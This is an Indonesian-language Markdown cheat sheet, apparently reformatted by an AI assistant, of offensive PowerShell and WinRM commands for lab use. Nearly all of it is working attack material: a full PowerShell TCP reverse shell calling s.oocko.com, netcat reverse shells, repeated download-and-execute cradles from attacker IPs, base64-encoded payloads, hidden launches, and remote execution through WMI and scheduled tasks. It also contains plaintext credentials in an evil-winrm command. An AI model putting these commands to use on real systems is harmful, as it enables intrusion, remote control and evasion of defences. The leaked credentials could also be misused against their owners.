Berikut versi **yang sudah dirapikan, konsisten format Markdown, dan lebih jelas strukturnya**.
Perbaikan yang saya lakukan:

* konsistensi heading
* pemisahan section
* konsistensi code block
* penambahan subjudul
* perbaikan indentasi PowerShell
* pemisahan WMI & schtasks agar tidak tercampur

---

# PowerShell Remoting & WinRM Lab Notes

Dokumentasi singkat berisi contoh command yang sering digunakan untuk:

* PowerShell Remoting
* Remote command execution
* Reverse shell
* File download
* Payload execution

---

# 1. Reverse Shell Example (PowerShell TCP)

Contoh **PowerShell TCP reverse shell**:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("s.oocko.com",443)
$stream = $client.GetStream()

[byte[]]$bytes = 0..65535 | % {0}

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){

    $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i)

    $sendback = (iex $data 2>&1 | Out-String)

    $sendback2 = $sendback + "PS " + (pwd).Path + "> "

    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)

    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}

$client.Close()
```

---

# 2. Evil-WinRM Example

Menggunakan tool **evil-winrm** untuk mendapatkan remote shell.

```
evil-winrm -i 10.13.37.12 -u teignton\jay.teignton -p B6rQx_d&RVqvcv2A
```

---

# 3. Run Command as Another User

Membuat **credential object**:

```powershell
$user = "datacenter\user_service"

$spass = ConvertTo-SecureString "Password.1" -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential ($user,$spass)
```

---

# 4. Execute Program With Credential

Menjalankan executable menggunakan credential lain.

```powershell
Start-Process "C:\Users\Public\m3.exe" -Credential $cred -WindowStyle Hidden
```

Reverse shell menggunakan **netcat**:

```powershell
Start-Process "C:\share\nc.exe" `
    -ArgumentList "-e cmd.exe 192.168.181.138 443" `
    -Credential $cred `
    -WindowStyle Hidden
```

---

# 5. Execute Remote PowerShell Payload

Menjalankan script dari remote server.

```powershell
Start-Job -ScriptBlock {
    IEX(New-Object Net.WebClient).DownloadString('http://10.13.14.11/rev1.ps1')
} -Credential $cred | Wait-Job | Receive-Job
```

---

# 6. Remote Command Execution

Menggunakan **Invoke-Command**.

### Menjalankan command sederhana

```powershell
Invoke-Command -ComputerName datacenter -Credential $cred -ScriptBlock { whoami }
```

### Reverse shell via remote command

```powershell
Invoke-Command -ComputerName datacenter -Credential $cred -ScriptBlock {
    C:\share\nc.exe -e cmd.exe 192.168.181.138 443
}
```

---

# 7. Interactive Remote Session

Membuka **PowerShell interactive session**.

```powershell
Enter-PSSession -ComputerName localhost -Credential $cred
```

---

# 8. Execute Script From File

Command dapat disimpan dalam file lalu dijalankan.

Menjalankan `st.ps1`:

```
powershell.exe -Exec Bypass -NoLogo -NonInteractive -NoProfile -File st.ps1
```

### Catatan

Untuk **Windows Server 2012 R2** biasanya cukup menggunakan:

```
powershell.exe -NoProfile -File st.ps1
```

---

# 9. Run 64-bit PowerShell

Jika shell berada pada **32-bit process**, jalankan PowerShell 64-bit:

```
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
```

Contoh menjalankan **PowerUp**:

```
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/PowerUp.ps1'); Invoke-AllChecks"
```

---

# 10. Download File via PowerShell

Mengunduh file dari server HTTP.

### WebClient Method

```powershell
(New-Object System.Net.WebClient).DownloadFile(
"http://192.168.22.31/nc.exe",
"C:\Users\Public\nc.exe"
)
```

### Invoke-WebRequest Method

```powershell
Invoke-WebRequest `
-Uri "http://10.10.14.114/m_443.exe" `
-OutFile "C:\Users\Public\m_443.exe"
```

---

# 11. Execute Remote Script

Menjalankan script langsung dari URL.

```powershell
powershell -ExecutionPolicy Bypass -Command `
"IEX(New-Object Net.WebClient).DownloadString('http://10.13.14.12/script.ps1')"
```

Contoh tools yang sering digunakan:

```
PowerUp.ps1
PowerView.ps1
Sherlock.ps1
```

---

# 12. Encode PowerShell Command

Encode command menjadi **Base64**.

```powershell
$Command = "IEX(New-Object Net.WebClient).DownloadString('http://192.168.2.27/ni.ps1')"

$Encoded = [Convert]::ToBase64String(
[System.Text.Encoding]::Unicode.GetBytes($Command)
)

Write-Host "Encoded command:"
Write-Host "powershell.exe -execution bypass -encodedCommand $Encoded"
```

---

# 13. Run Hidden PowerShell Process

Menjalankan payload secara **background**.

### Menggunakan Start-Process

```powershell
Start-Process powershell `
-ArgumentList "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.41/ni.ps1')" `
-WindowStyle Hidden
```

### Menggunakan PowerShell Job

```powershell
Start-Job -ScriptBlock {
    IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.41/ni.ps1')
}
```

---

# 14. Remote Execution via WMI

Menjalankan payload melalui **WMI**.

```powershell
Invoke-WmiMethod `
-Class Win32_Process `
-Name Create `
-ComputerName dc01 `
-Credential $cred `
-ArgumentList "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/rev.ps1')"
```

---

# 15. Remote Execution via Scheduled Task

Menjalankan payload melalui **Scheduled Task**.

```
schtasks /create /sc once /st 12:00 /tn testtask /tr "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/rev.ps1')" /ru DOMAIN\user /rp Password123
```

---

# 16. Switching CMD → PowerShell

Jika berada di **CMD shell**:

```
powershell -nop -w 1
```

Hasilnya:

```
PS C:\Users\user>
```
